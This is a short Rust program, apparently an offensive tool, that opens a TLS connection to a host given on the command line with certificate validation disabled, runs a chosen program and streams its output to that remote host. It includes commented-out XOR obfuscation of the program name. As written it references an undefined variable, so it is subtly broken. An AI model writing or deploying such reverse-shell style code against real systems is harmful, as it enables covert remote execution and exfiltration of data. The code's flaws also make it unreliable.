use std::io::{Read, Write, BufRead, BufReader};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::thread;
use native_tls::TlsConnector;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 5 {
        eprintln!("Usage: {} <host> <port> <envvar> <arguments> <xorkey>", args[0]);
        std::process::exit(1);
    }

    let host = &args[1];
    let port = &args[2];
    let envvar = &args[3];
    let arguments = &args[4];
    /*let xorkey: u8 = args[5].parse().expect("Invalid XOR key");
	let envvar1: String = envvar.chars()
        .map(|c| (c as u8 ^ xorkey) as char)
        .collect();*/

    //let envvar1: String = envvar.chars();

    println!("Executing {} {} and redirecting stdout / stderr to {}:{}", envvar1, arguments, host, port);

    let addr = format!("{}:{}", host, port);
    let stream = TcpStream::connect(&addr).expect("Failed to connect to the server");
    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let mut stream = connector.connect(host, stream).unwrap();

    let (tx, rx) = mpsc::channel();
    let tx2 = tx.clone();
	
    let mut child = Command::new(envvar)
        .args(arguments.split_whitespace())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to execute command");

    let stdout = child.stdout.take().unwrap();
    thread::spawn(move || {
        let reader = BufReader::new(stdout);
        for line in reader.lines() {
            let line = line.unwrap();
            tx.send(line).unwrap();
        }
    });

    let stderr = child.stderr.take().unwrap();
    thread::spawn(move || {
        let reader = BufReader::new(stderr);
        for line in reader.lines() {
            let line = line.unwrap();
            tx2.send(line).unwrap();
        }
    });

    loop {
        let line = rx.recv().unwrap();
        writeln!(stream, "{}", line).unwrap();
        stream.flush().unwrap();
    }
}
